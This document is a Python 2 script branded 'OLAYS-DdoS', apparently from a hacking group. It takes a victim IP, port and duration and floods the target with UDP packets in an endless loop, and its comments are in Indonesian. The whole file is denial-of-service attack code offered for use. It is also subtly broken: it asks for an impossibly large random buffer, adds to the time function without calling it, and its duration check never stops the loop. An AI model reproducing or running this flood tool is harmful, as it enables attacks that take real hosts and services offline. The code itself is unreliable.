import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#########################################################"
    print "#------------------------[\033[1;91mOLAYS-DdoS\033[1;32m]---------------------#"
    print "#-------------------------------------------------------#"
    print "#   \033[1;91mCommand: " "python2 OLAYS-DdoS.py " "<ip> <port> <packet> \033[1;32m   #"
    print "#                                                       #"
    print "#\033[1;91mCreator:KeepAlive  \033[1;32m ##      ###       ##                #"
    print "#\033[1;91mTeam   : OCT 86-99 \033[1;32m ##     86-99      ##                #"
    print "#\033[1;91mVersion:1.0        \033[1;32m ##      ###       ##                #"
    print "#                   ## \033[1;91m  ##     \033[1;32m ###  \033[1;91m  ##  \033[1;32m ##                #"
    print "#                   ##  \033[1;91m ##  \033[1;32m    ###   \033[1;91m ##  \033[1;32m ######            #"
    print "#               \033[1;91m<--[ OLAYS 86-99 CYBER-TEAM ]-->         \033[1;32m#"
    print "#########################################################"
    print "                        @@@@@@@@@@"
    print "                       @@@@@@@@@@@@"
    print "                     @@@@@@@@@@@@@@@@"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(9000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    timenext =  time.time + duration
    sent = 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

    while 1:
        if time.time() > timenext:
            next
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
    
    
